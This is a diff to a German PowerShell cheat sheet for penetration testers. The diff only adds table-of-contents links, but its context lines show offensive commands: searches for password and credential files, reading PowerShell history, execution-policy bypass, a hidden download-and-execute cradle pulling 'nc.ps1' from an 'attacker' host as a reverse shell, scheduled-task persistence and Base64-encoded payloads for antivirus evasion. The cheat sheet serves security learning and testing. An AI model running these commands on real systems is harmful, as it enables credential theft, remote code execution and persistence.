@@ -27,6 +27,14 @@ Dieses Cheatsheet bietet eine schnelle Referenz für den **Einsatz von PowerShel
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Systeminformationen
 
 ```powershell
@@ -36,6 +44,14 @@ hostname
 Get-WmiObject -Class Win32_OperatingSystem
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Benutzer & Gruppen
@@ -68,6 +84,14 @@ Test-NetConnection -ComputerName <IP> -Port <Port>
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Dateisystem und Suche
 
 ```powershell
@@ -76,6 +100,14 @@ dir -Recurse -Filter *password*
 Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Prozesse & Dienste
@@ -87,6 +119,14 @@ Get-Service
 Get-WmiObject win32_service | Where { $_.State -eq "Running" }
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Execution Policies & Umgehung
@@ -112,12 +152,28 @@ powershell.exe -ExecutionPolicy Bypass -File script.ps1
 Invoke-WebRequest "http://ip/script.ps1" -OutFile "script.ps1"
 ```
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Remote Shell (reverse)
 
 ```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker/nc.ps1')
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## PowerShell Recon & Enum
@@ -128,17 +184,41 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClie
 Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *pass*,*cred*,*vnc* | Select-String -Pattern "password"
 ```
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Benutzerkontext
 
 ```powershell
 Get-CimInstance Win32_LoggedOnUser
 ```
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Scheduled Tasks
 
 ```powershell
 Get-ScheduledTask | Where-Object {$_.TaskPath -like "*"}
 ```
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ## PowerShell für Angreifer
 
@@ -169,6 +249,14 @@ Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger
 
  
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## AV-Evasion Basics (nur zu Lernzwecken!)
 ```powershell
 # Base64-Encoding Payloads
@@ -177,6 +265,14 @@ $encoded = [Convert]::ToBase64String($bytes)
 powershell -EncodedCommand $encoded
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Nützliche Module & Projekte
@@ -189,6 +285,14 @@ powershell -EncodedCommand $encoded
 | Empire         | [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)                                                           |
 | PowerSharpPack | [https://github.com/S3cur3Th1sSh1t/PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)                                     |
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Verknüpfte Dateien im Repository
